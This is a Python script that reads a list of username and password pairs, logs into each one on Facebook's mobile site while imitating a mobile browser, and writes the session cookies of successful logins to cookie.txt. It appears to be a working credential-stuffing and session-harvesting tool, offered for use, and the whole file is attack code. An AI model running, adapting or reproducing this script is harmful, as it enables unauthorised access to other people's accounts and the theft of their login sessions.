import os, sys, re, time
import requests
from bs4 import BeautifulSoup as bs

# Convert Cookie Formate
def convert(data):
    cookie_data = (
            "datr="+data["datr"]
        )+";"+(
            "c_user="+data["c_user"]
        )+";"+(
            "fr="+data["fr"]
        )+";"+(
            "xs="+data["xs"] )
    return cookie_data


def real_time():
    from time import time
    return str(time()).split('.')[0]

# Get Cookie
def getCookie(user, pw):
    
    ses = requests.Session()
    
    agent = "Mozilla/5.0 (Linux; Android 10; CPH2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36"
    
    try:
        head = {
            'Host' : 'm.facebook.com',
                'cache-control' : 'max-age=0',
            'upgrade-insecure-requests' : '1',
                'user-agent' : agent,
            'accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'sec-fetch-mode' : 'navigate',
                'sec-fetch-user' : '?1',
            'sec-fetch-dest' : 'document',
                'accept-encoding' : 'gzip, deflate',
            'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        try:
            r = ses.get("https://m.facebook.com/", headers = head).text.encode('utf-8')
        except:
            r = ses.get("https://m.facebook.com/", headers = head).text
        head2 = {
            'Host' : 'm.facebook.com',
                'user-agent' : agent,
            'content-type' : 'application/x-www-form-urlencoded',
                'x-fb-lsd' : re.search('name="lsd" value="(.*?)"', str(r)).group(1),
            'accept' : '*/*',
                'origin' : 'https://m.facebook.com',
            'sec-fetch-site' : 'same-origin',
                'sec-fetch-mode' : 'cors',
            'sec-fetch-dest' : 'empty',
                'referer' : 'https://m.facebook.com/',
            'accept-encoding' : 'gzip, deflate',
                'accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
        }
        payload = {
            "fb_dtsg" : re.search('{"token":"(.*?)"', str(r)).group(1),
                "lsd" : re.search('name="lsd" value="(.*?)"', str(r)).group(1),
            "jazoest" : re.search('name="jazoest" value="(.*?)"', str(r)).group(1),
                "m_ts" : re.search('name="m_ts" value="(.*?)"', str(r)).group(1),
            "li" : re.search('name="li" value="(.*?)"', str(r)).group(1),
                "try_number" : "0",
            "unrecognized_tries" : "0",
                "prefill_contact_point" : user,
            "prefill_source" : "browser_dropdown",
                "prefill_type" : "contact_point",
            "first_prefill_source" : "browser_dropdown",
                "first_prefill_type" : "contact_point",
            "had_cp_prefilled" : True,
                "had_password_prefilled" : False,
            "is_smart_lock" : False,
                "bi_xrwh" : "0",
            "__dyn" : "",
                "__csr" : "",
            "__req" : "2",
                "__a" : "",
            "__user" : "0",
                "email" : user,
            "encpass" : "#PWD_BROWSER:0:"+real_time()+":"+pw
        }
        ses.post("https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100", headers = head2, data = payload)
        cookie = ses.cookies.get_dict()
        if 'c_user' in (cookie):
            return cookie
        
        else:
            print(f"\r\033[91mCP or Wrong: \033[37m{user} || {pw}")
#        else:
#            print(f"\r\033[91mWrong: \033[37m{user} || {pw}")
        
        return None
    except:
        return None


# Main Process
def main():
    os.system("rm cookie.txt > /dev/null 2>&1")
    
    filename = input("Enter File Name: ")
    
    if not os.path.exists(filename):
        sys.exit("File Not Found!")
    
    fileData = open(filename, "r").readlines()
    
    idz = len(fileData)
    done = 0
    for acc in fileData:
        sys.stdout.write(f"\rScanning: {done} / {idz}")
        sys.stdout.flush()
        time.sleep(1)

        user = acc.split(" || ")[0].replace(" ", "").replace("\n", "")
        passw = acc.split(" || ")[1].replace(" ", "").replace("\n", "")
        
        done += 1
        cookie = getCookie(user, passw)
        if not (cookie == None):
            cookie = convert(cookie)
            open("cookie.txt", "a").write(cookie+"\n")
        sys.stdout.write(f"\rScanning: {done} / {idz}")
        sys.stdout.flush()
    
    

main()

